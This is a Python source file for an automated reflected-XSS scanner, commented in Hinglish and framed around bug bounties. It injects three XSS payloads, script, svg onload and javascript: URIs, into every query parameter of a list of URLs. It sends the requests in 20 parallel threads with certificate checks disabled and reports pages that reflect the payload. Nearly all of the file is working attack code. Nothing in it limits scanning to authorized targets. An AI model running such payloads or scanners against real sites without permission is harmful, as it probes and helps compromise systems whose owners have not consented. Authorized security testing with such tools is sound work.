import requests
import concurrent.futures
import sys
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Clean terminal output
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def print_banner():
    print("""
    ==================================================
        THE PAYLOAD INJECTOR - Automated XSS Scanner
    ==================================================
    """)

# Global session for connection pooling (Speed!)
session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) XSS-Sniper/1.0"})

# The Hacker's Payload Arsenal (Can add more later)
PAYLOADS = [
    "'\"><script>alert('VULN')</script>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)//"
]

def inject_and_test(url, payload):
    """
    Python Deep-Dive: urlparse
    Ye function URL ke tukde karta hai: scheme, netloc, path, params, query, fragment
    Example: https://google.com/search?q=test
    Query part = 'q=test'
    """
    parsed_url = urlparse(url)
    
    # parse_qs query string ko dictionary mein badal deta hai. {'q': ['test']}
    query_params = parse_qs(parsed_url.query)
    
    if not query_params:
        return None # Agar URL mein koi parameter hi nahi hai, toh chhod do

    vulnerabilities = []

    # Har parameter ke andar ek ek karke payload dalenge
    for param_name in query_params.keys():
        # Dictionary ki copy banate hain taaki original kharab na ho
        malicious_params = query_params.copy()
        
        # Asli value hata kar apna payload set kar diya!
        malicious_params[param_name] = payload
        
        # Wapas dictionary ko query string (q=payload) mein convert kiya
        new_query_string = urlencode(malicious_params, doseq=True)
        
        # Wapas URL ke tukdon ko jod kar naya Malicious URL banaya
        malicious_url = urlunparse((
            parsed_url.scheme, 
            parsed_url.netloc, 
            parsed_url.path, 
            parsed_url.params, 
            new_query_string, 
            parsed_url.fragment
        ))

        try:
            # Payload fire karo!
            response = session.get(malicious_url, timeout=5, verify=False)
            
            # The Magic Check: Kya humara payload wapas page ke source code mein aaya?
            if payload in response.text:
                vulnerabilities.append(f"[!!!] JACKPOT 🎯 Reflected XSS Found!\n    [+] Vulnerable Param: {param_name}\n    [+] Payload: {payload}\n    [+] URL: {malicious_url}")
                
        except requests.exceptions.RequestException:
            pass # Connection errors ko ignore karo

    return vulnerabilities if vulnerabilities else None

def start_scanning(urls_file, threads=20):
    print_banner()
    
    try:
        with open(urls_file, 'r') as f:
            # Sirf wo URLs lenge jisme '?' ho (matlab parameters hain)
            urls = [line.strip() for line in f if '?' in line]
        print(f"[*] Loaded {len(urls)} parameterized URLs for testing.")
    except FileNotFoundError:
        print(f"[-] ERROR: File '{urls_file}' not found!")
        sys.exit(1)

    print(f"[*] Firing {len(PAYLOADS)} different payloads using {threads} parallel threads...\n")
    print("-" * 60)

    found_bugs = 0

    # Multi-threading Engine
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        # Har URL aur har payload ka combination banayenge
        futures = []
        for url in urls:
            for payload in PAYLOADS:
                futures.append(executor.submit(inject_and_test, url, payload))
        
        for future in concurrent.futures.as_completed(futures):
            results = future.result()
            if results:
                for res in results:
                    print(res)
                    found_bugs += 1

    print("-" * 60)
    if found_bugs > 0:
        print(f"[+] Scan Complete! Found {found_bugs} XSS Vulnerabilities! Time to claim bounties! 💸")
    else:
        print("[-] Scan complete. Target seems secure against basic Reflected XSS.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 xss_sniper.py <param_urls.txt>")
        print("Example: python3 xss_sniper.py urls_with_params.txt")
        sys.exit(1)
        
    target_file = sys.argv[1]
    start_scanning(target_file)
